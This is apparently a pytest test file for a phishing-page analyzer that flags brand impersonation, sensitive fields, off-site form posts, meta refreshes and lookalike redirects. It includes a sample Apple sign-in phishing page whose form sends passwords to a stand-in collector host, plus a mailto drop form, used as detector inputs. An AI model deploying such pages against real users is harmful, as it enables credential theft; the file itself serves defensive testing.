"""P2 page analysis (architecture.md §23): hostile HTML in, plain findings out."""

from pathlib import Path

import pytest
from hypothesis import given
from hypothesis import strategies as st

from scamsentinel.data import load_brands, load_keywords
from scamsentinel.page.analyze import MAX_TITLE_CHARS, PageAnalyzer
from scamsentinel.page.fetch import FetchedPage

DATA_DIR = Path(__file__).resolve().parents[2] / "data"

APPLE_PHISH = """
<html><head><title>Sign in to your Apple Account</title>
<script>var brand = "Wells Fargo Wells Fargo Wells Fargo";</script></head>
<body><img src="logo.png" alt="Apple ID">
<form action="https://collector.example.net/post.php" method="post">
  <input type="email" name="appleId" placeholder="Apple ID">
  <input type="password" name="pwd">
  <input type="hidden" name="cvv_token" value="x">
  <button>Continue</button>
</form></body></html>
"""


@pytest.fixture
def analyzer(engine):
    return PageAnalyzer(
        load_brands(DATA_DIR), load_keywords(DATA_DIR).entity_mentions, engine
    )


def page(html, url="https://appleid-unlock-support.com/login", requested=None, redirects=()):
    return FetchedPage(
        requested_url=requested or url, final_url=url, html=html, redirects=list(redirects)
    )


def signals(report) -> dict[str, str]:
    return {f.signal: f.detail for f in report.findings}


def test_apple_phishing_page(analyzer):
    report = analyzer.analyze(page(APPLE_PHISH))
    found = signals(report)
    assert report.status == "analyzed"
    assert report.title == "Sign in to your Apple Account"
    assert report.brand == "Apple"
    assert "password" in found["sensitive_fields"]
    assert "card details" not in found["sensitive_fields"]  # the hidden field doesn't count
    # Named by its registrable domain: who actually owns the site that receives the data.
    assert "sends what you type to example.net" in found["form_posts_elsewhere"]
    assert "appleid-unlock-support.com" in found["brand_on_unofficial_page"]
    assert "apple.com" in found["brand_on_unofficial_page"]


def test_text_inside_scripts_is_ignored(analyzer):
    # The script names Wells Fargo three times; only visible text and the title count.
    assert analyzer.analyze(page(APPLE_PHISH)).brand == "Apple"


def test_the_brands_own_site_is_not_flagged(analyzer):
    report = analyzer.analyze(page(APPLE_PHISH, url="https://appleid.apple.com/sign-in"))
    assert "brand_on_unofficial_page" not in signals(report)
    assert report.brand is None


@pytest.mark.parametrize(
    ("field", "label"),
    [
        ('<input name="ssn">', "Social Security number"),
        ('<input autocomplete="cc-number">', "card details"),
        ('<input name="cvv">', "card details"),
        ('<input autocomplete="one-time-code">', "verification code"),
        ('<input placeholder="Verification code">', "verification code"),
        ('<input type="password">', "password"),
    ],
)
def test_sensitive_fields(analyzer, field, label):
    found = signals(analyzer.analyze(page(f"<form>{field}</form>")))
    assert label in found["sensitive_fields"]


def test_same_site_form_is_not_flagged(analyzer):
    html = '<form action="/login"><input type="password"></form>'
    assert "form_posts_elsewhere" not in signals(analyzer.analyze(page(html)))


def test_mailto_form(analyzer):
    html = '<form action="mailto:drop@example.org"><input name="ssn"></form>'
    assert "emails what you type" in signals(analyzer.analyze(page(html)))["form_posts_elsewhere"]


def test_meta_refresh_to_another_domain(analyzer):
    html = '<meta http-equiv="refresh" content="0; url=https://next-hop.net/x">'
    assert "next-hop.net" in signals(analyzer.analyze(page(html)))["meta_refresh"]


def test_redirect_to_a_lookalike_is_explained(analyzer):
    report = analyzer.analyze(
        page(
            "<p>hi</p>",
            url="https://appleid-unlock-support.com/",
            requested="https://bit.ly/3abc",
            redirects=["https://appleid-unlock-support.com/"],
        )
    )
    detail = signals(report)["redirected"]
    assert "redirected 1 time and ended at appleid-unlock-support.com" in detail
    assert "looks like an Apple domain but isn't one" in detail


def test_clean_page_has_no_findings(analyzer):
    report = analyzer.analyze(page("<title>Recipes</title><p>Soup</p>", url="https://example.org/"))
    assert report.findings == []


@pytest.mark.parametrize(
    ("error", "status"),
    [("dry_run", "dry_run"), ("blocked:non_public_address", "blocked"),
     ("blocked:egress", "blocked"), ("timeout", "failed"), ("disabled:safety", "failed")],
)
def test_pages_that_werent_fetched(analyzer, error, status):
    report = analyzer.analyze(FetchedPage(requested_url="https://x.example/", error=error))
    assert report.status == status
    assert report.error == error
    assert report.findings == []


def test_title_is_capped(analyzer):
    report = analyzer.analyze(page(f"<title>{'A' * 1000}</title>"))
    assert len(report.title) == MAX_TITLE_CHARS


@given(st.text(max_size=2000))
def test_hostile_html_never_crashes(engine, html):
    analyzer = PageAnalyzer(load_brands(DATA_DIR), load_keywords(DATA_DIR).entity_mentions, engine)
    report = analyzer.analyze(page(html))
    assert report.status == "analyzed"


def test_malformed_markup(analyzer):
    html = "<form action='https://x.example/p'><input type=password<<title>Apple ID</titl"
    analyzer.analyze(page(html))  # must not raise
